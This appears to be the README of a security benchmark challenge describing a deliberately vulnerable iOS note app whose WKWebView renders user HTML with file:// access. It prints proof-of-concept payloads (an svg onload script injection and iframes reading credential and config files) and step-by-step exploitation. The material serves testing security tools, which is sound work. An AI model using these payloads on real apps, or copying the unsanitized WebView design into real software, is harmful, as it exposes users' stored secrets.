# oxo-ios-ben12 ShareNote - iOS Internal file access from HTML / Webkit

## Challenge Details

### Description
A modern note-taking application for iOS, "ShareNote," allows users to create rich HTML-formatted notes with templates and multimedia content. The application features a clean SwiftUI interface and supports various note types including meeting notes, project plans, and reports. However, the HTML rendering engine contains a critical security flaw that allows attackers to access local files from the iOS app's sandbox using Server-Side Request Forgery (SSRF) techniques. Can your tool identify the missing input validation and URL scheme restrictions?

### Vulnerability Type and Category
- **Type:** Server-Side Request Forgery (SSRF) - Local File Disclosure
- **Category:** Injection Flaws

### Weakness (CWE)
- **CWE-918:** Server-Side Request Forgery (SSRF)

### Platform
iOS (Swift/SwiftUI)

### Difficulty
Medium

## Vulnerability Overview
The application's `NoteDetailView` class renders user-provided HTML content directly in a WKWebView without proper sanitization or URL scheme restrictions. While the app provides legitimate templates for note-taking, it allows unrestricted HTML content that can exploit the `file://` protocol to access local files within the iOS app's sandbox. This design flaw enables attackers to read sensitive application data, configuration files, and any documents stored in the app's directory structure.

**Key Vulnerability Points:**
- No HTML input sanitization
- Unrestricted URL scheme access in WebView
- Direct file:// protocol access enabled
- No Content Security Policy (CSP) implementation
- Sensitive data stored in plain text files

## Real-World Context
This vulnerability mirrors the actual security issue discovered in the Nextcloud iOS application (HackerOne Report #746541), where HTML content could access local files using iframe elements with file:// URLs. The vulnerability was classified as Medium severity and demonstrates how mobile applications can be vulnerable to SSRF attacks when handling user-generated content.

## Exploitation Vector
1. **Content Creation:** An attacker creates a note with malicious HTML content containing SSRF payloads.
2. **Path Discovery:** Using JavaScript injection (`<svg/onload=document.write(document.location)>`), the attacker discovers the app's file system paths.
3. **File Access:** The attacker crafts iframe elements with `file://` URLs to access sensitive files in the app's Documents directory.
4. **Data Exfiltration:** Sensitive information including credentials, API keys, and configuration data is displayed within the note interface.

## Proof of Concept Payloads

### 1. Path Discovery
```html
<svg/onload=document.write(document.location)>
```
**Result:** Reveals the complete file system path of the application.

### 2. Credential File Access
```html
<iframe src="file:///var/mobile/Containers/Data/Application/[APP-ID]/Documents/secret_credentials.txt" 
        width="100%" height="400" style="border: 2px solid red;">
</iframe>
```
**Result:** Displays the complete contents of the credentials file.

### 3. Configuration File Access
```html
<iframe src="file:///var/mobile/Containers/Data/Application/[APP-ID]/Documents/app_config.json" 
        width="100%" height="300" style="border: 2px solid orange;">
</iframe>
```
**Result:** Exposes application configuration and internal file paths.

### 4. Combined Multi-File Attack
```html
<h1 style="color: red;">🚨 SSRF Attack Demonstration</h1>
<h2>1. Secret Credentials:</h2>
<iframe src="file://[DOCS_PATH]/secret_credentials.txt" width="100%" height="200"></iframe>
<h2>2. App Configuration:</h2>
<iframe src="file://[DOCS_PATH]/app_config.json" width="100%" height="150"></iframe>
```
**Result:** Simultaneous access to multiple sensitive files in a single note.

## Build Instructions
This is a standard Xcode project built with SwiftUI for iOS 15.0+.

### Prerequisites
- Xcode 14.0 or later
- iOS 15.0+ Simulator or physical device
- macOS 12.0+ for development

### Building and Running
1. Open `sharenote.xcodeproj` in Xcode
2. Select your target device (Simulator or physical device)
3. Build and run the project (`Cmd + R`)
4. The app will automatically create vulnerable files in the Documents directory

## Testing the Vulnerability

### Step-by-Step Exploitation
1. **Launch ShareNote** in iOS Simulator or on a device
2. **Create a new note** by tapping the "+" button
3. **Enter malicious HTML** using one of the PoC payloads above
4. **Save the note** with any title
5. **Open the created note** to trigger the SSRF attack
6. **Observe** how local files are rendered within the WebView

### Expected Results
- ✅ Path discovery reveals app sandbox location
- ✅ Secret credentials are displayed in the note
- ✅ Configuration file contents are accessible
- ✅ No security warnings or restrictions are enforced
